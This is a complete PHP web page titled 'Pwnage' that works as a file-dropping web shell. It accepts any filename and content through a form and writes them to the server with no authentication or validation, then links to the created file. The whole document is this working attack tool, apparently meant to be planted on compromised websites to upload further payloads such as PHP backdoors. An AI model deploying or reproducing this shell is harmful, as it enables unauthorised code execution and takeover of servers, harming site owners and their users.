<?php 


if ( 	isset($_POST['filename'])	&& 	isset($_POST['filecontent']) ) {
	

	$filename       =   $_POST['filename'];
	$filecontent	= 	$_POST['filecontent'];

		if (!empty($filename) && !empty($filecontent)) {
			

				if (file_exists($filename)) {

					echo 'Sorry! The filename already exists<br>';
					
				} else {


				$file = fopen($filename, "a");


				fwrite($file, $filecontent);

				fclose($file);

					echo '<a href="'.$filename.'" style="color:lime;">Done!</a><br>';
}



		}  else {

			echo 'Why the fuck you are here?<br>';
		}


}


/**Rony Das**/  

?> 






<html>

<style>


body {

	background:black;
	color: white;
	font-family: courier;
	text-align: center;


}


input {

	width: 25%;
	font-family: courier;
	padding: 7px;
	outline: none;
	border-radius: 25px;
	border: none;



}


button{

	width: 15%;
	padding: 7px;
	outline: none;
	border-radius: 25px;
	border: none;
}


textarea {

	font-family: courier;
	padding: 15px;
	outline: none;
	border-radius: 10px;
	border: none;
}

</style>

<center>
<title>Pwnage</title>
<form action="" method="post">
File Name:<br>
<input type="text" name="filename" placeholder="Filename"> <br><br>
File Content:<br>
&nbsp&nbsp<textarea name="filecontent" placeholder="Your Content" rows="10" cols="70"></textarea>
<br><br>
&nbsp&nbsp
<button>Submit</button>

</form>

</html>